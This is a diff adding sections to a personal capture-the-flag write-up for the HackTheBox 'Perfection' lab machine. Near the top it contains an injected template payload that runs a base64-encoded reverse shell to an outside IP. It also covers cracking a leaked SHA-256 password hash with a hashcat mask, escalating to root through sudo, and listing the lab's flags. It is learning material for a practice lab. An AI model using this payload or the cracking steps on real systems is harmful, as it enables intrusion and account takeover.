@@ -255,6 +255,9 @@ The script is equivalent to executing
 $ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D+system%28%22echo+%27MDwmMTk2OyBleGVjIDE5Njw%2BL2Rldi90Y3AvMTAuMTAuMTYuMTEvNjk2OTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2%27+%7C+base64+--decode+%7C+bash%22%29+%25%3E&grade5=10&weight5=10'
 ----
 
+The reason I encoded the payload into base64 is so that it won't get chopped up by the input sanitization.
+I don't really understand why that's needed but the payload doesn't execute without it.
+
 .Reverse Shell Success
 image::perfection/reverse_shell.png[]
 
@@ -272,20 +275,291 @@ a492e9d8a7e5c4d0cc14e27ce647d655
 
 === Root Flag
 
+I tried looking around for possible ways to gain root access.
+Yep, clearly I do not know what to do.
+Thus, I just went and checked the files of the user directory of ``susan``.
+
+.Susan's Home Directory
+----
+$ ls -la
+
+total 48
+drwxr-x--- 7 susan susan 4096 Feb 26 09:41 .
+drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
+-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
+drwx------ 2 susan susan 4096 Oct 27  2023 .cache
+drwx------ 3 susan susan 4096 Oct 27  2023 .gnupg
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
+drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
+drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration <.>
+-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
+drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app <.>
+lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
+-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
+-rw-r----- 1 root  susan   33 Jun 20 10:06 user.txt <.>
+-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
+----
+<.> Database containing some credentials
+<.> The Ruby HTTP web server source code
+<.> User Flag
+
+
+The ``/home/susan/Migration/`` directory looks promising.
+
+./home/susan/Migration/
+----
+$ ls -la
+
+total 16
+drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
+drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..
+-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
+
+$ strings pupilpath_credentials.db
+
+SQLite format 3
+tableusersusers
+CREATE TABLE users (
+id INTEGER PRIMARY KEY,
+name TEXT,
+password TEXT
+Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
+David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
+Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
+Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
+Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f <.>
+----
+<.> What we are probably interested in.
+
+This seems like a database that stores the user's password.
+I don't know how to crack it.
+I don't know what the conditions are.
+Is it an MD5 hash? SHA256?
+No idea.
+
+What I did instead was list the directories: ``/var``, ``/usr``, ``/etc``, ``/sys``, and ``/srv``.
+But only ``/var/`` came up with something interesting.
+
+.Listing the /var/* directory
+----
+$ ls -la /var/*
+
+... <.>
+/var/mail:
+total 12
+drwxrwsr-x  2 root mail  4096 May 14  2023 .
+drwxr-xr-x 13 root root  4096 Oct 27  2023 ..
+-rw-r-----  1 root susan  625 May 14  2023 susan
+
+/var/opt:
+total 8
+drwxr-xr-x  2 root root 4096 Feb 17  2023 .
+drwxr-xr-x 13 root root 4096 Oct 27  2023 ..
+
+/var/spool:
+total 16
+drwxr-xr-x  4 root   root 4096 Feb 17  2023 .
+drwxr-xr-x 13 root   root 4096 Oct 27  2023 ..
+drwxr-xr-x  3 root   root 4096 Feb 17  2023 cron
+lrwxrwxrwx  1 root   root    7 Feb 17  2023 mail -> ../mail
+drwx------  2 syslog adm  4096 May  2  2022 rsyslog
+... <.>
+----
+<.> Truncated results
+<.> Truncated results
+
+Look, there's a ``mail/`` directory inside ``/var/``!
+I wonder what's inside.
+It is also made for *susan*.
+
+.Susan's Mail
+----
+$ cat /var/mail/susan
+
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+----
+
+Ah, now that makes sense.
+The database I saw earlier was the passwords for the students who probably developed the web server.
+Aaaaand it's very insecure...
+
+The password of *susan* can easily be bruteforced.
+Before that, I need to identify the hashing algorithm being used.
+I looked online and I found out ``hash-id`` is built-in on ParrotOS.
+
+.Identifying the hash type of the password
+----
+$ hashid -m -j 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
+
+Analyzing 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
+[+] Snefru-256 [JtR Format: snefru-256]
+[+] SHA-256 [Hashcat Mode: 1400][JtR Format: raw-sha256]
+[+] RIPEMD-256 
+[+] Haval-256 [JtR Format: haval-256-3]
+[+] GOST R 34.11-94 [Hashcat Mode: 6900][JtR Format: gost]
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 [Hashcat Mode: 5000][JtR Format: raw-keccak-256]
+[+] Skein-256 [JtR Format: skein-256]
+[+] Skein-512(256) 
+----
+
+It looks like a *SHA256* hash.
+I wasn't sure so I tested it on *hashcat*.
+
+.hashcat bruteforce
+----
+$ echo 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f' > /tmp/hash.txt
+$ hashcat -m 1400 -a 3 -o /tmp/cracked.txt /tmp/hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d?d
+$ hashcat -m 1400 -a 3 -o /tmp/cracked.txt /tmp/hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d?d --show <.>
+----
+<.> Returns nothing.
+
+The cracked hash is stored in ``/tmp/cracked.txt``.
+The result is
+
+.Cracked hash password
+----
+$ cat /tmp/cracked.txt 
+
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+----
+
+Let's test ``*susan_nasus_413759210*``.
+
+.Testing root access
+----
+$ sudo -l -S
+
+[sudo] password for susan: susan_nasus_413759210
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL
+
+
+$ whoami
+
+susan
+
+
+$ sudo -i 
+$ ls
+
+root.txt
+
+
+$ whoami
+
+root
+----
+
+Oh, it worked!
+We're now *root*!
+
+.Showing the Flag
+----
+$ cat /root/root.txt
+
+46d669fa19c3b6afa25e622410b7c469
+----
+
 == Post-Exploitation
 
+I wanted to see how the web server works.
+Thus, I went and grabbed the source code of the web server.
+It was stored in ``/home/susan/ruby_app/``.
+
+
 == Challenge Summaries
-
-== Lessons Learned
-
-== Conclusion
 
 
 [IMPORTANT] 
 .Flag
 ==== 
-user:
+user:a492e9d8a7e5c4d0cc14e27ce647d655
 
-root:
+root:46d669fa19c3b6afa25e622410b7c469
 ====
+
+== Conclusion
+
+I looked up few writeups online while doing the challenge when I got stuck.
+Not really a good feeling but I needed to learn.
+It is this https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224[writeup] that made me realize of using shell commands in a way that I should be.
+
+Writing this writeup after about 29 days of not touching the challenge was a good way to waste my time but at the same time redo the challenge without having to look stuffs up.
+I still had issues on trying to get passed the input sanitization thus I have to check if my inputs were wrong, they were the same.
+I just made small mistakes like typos.
+
+Apparently, a better way to acquire the user flag is to use the find command and by executing the cat command.
+
+.Better way to print the user flag
+----
+$ find / -name "user.txt" -exec cat {} \; 2>/dev/null
+
+a492e9d8a7e5c4d0cc14e27ce647d655
+----
+
+Similar to finding the root flag.
+
+.Better way to print the root flag
+----
+$ find / -name "root`.txt" -exec cat {} \; 2>/dev/null
+
+46d669fa19c3b6afa25e622410b7c469
+----
+
+.Files owned by the user
+----
+$ find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"
+
+    36258      4 -rw-------   1 susan    crontab      1168 May 14  2023 /var/spool/cron/crontabs/susan
+     1020      4 -rw-r--r--   1 susan    susan          39 Oct 17  2023 /home/susan/.vimrc
+     1031      4 -rw-r--r--   1 susan    susan         220 Feb 27  2023 /home/susan/.bash_logout
+     1032      4 -rw-r--r--   1 susan    susan        3771 Feb 27  2023 /home/susan/.bashrc
+     1033      4 -rw-r--r--   1 susan    susan         807 Feb 27  2023 /home/susan/.profile
+     3653      0 -rw-r--r--   1 susan    susan           0 Oct 27  2023 /home/susan/.sudo_as_admin_successful
+     2202      4 -rw-------   1 susan    susan          32 May 14  2023 /home/susan/.gnupg/pubring.kbx
+     2233      4 -rw-------   1 susan    susan        1200 May 14  2023 /home/susan/.gnupg/trustdb.gpg
+     1147      0 -rw-r--r--   1 susan    susan           0 Feb 28  2023 /home/susan/.cache/motd.legal-displayed
+----
+
+.Files with the name of the user in it
+----
+$ find / -name "*susan*" -type f -ls 2>/dev/null
+
+    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
+    36258      4 -rw-------   1 susan    crontab      1168 May 14  2023 /var/spool/cron/crontabs/susan
+     1227     12 -rw-r--r--   1 root     susan        8597 Apr  3  2023 /home/susan/ruby_app/public/images/susan.jpg
+     1390      4 -rw-------   1 root     susan         168 Jun 20 14:39 /run/sudo/ts/susan
+----
+
+.Files with the word password in the home directory
+----
+$ grep -i password -R /home/$(whoami) <.>
+
+grep: /home/susan/Migration/pupilpath_credentials.db: binary file matches
+----
+<.> Have to be logged in as ``*susan*``.
+
+
+I think I have skipped a lot in this writeup but that should be alright for future me since I only have to write stuffs that I will need.
+
+== Lessons Learned
 
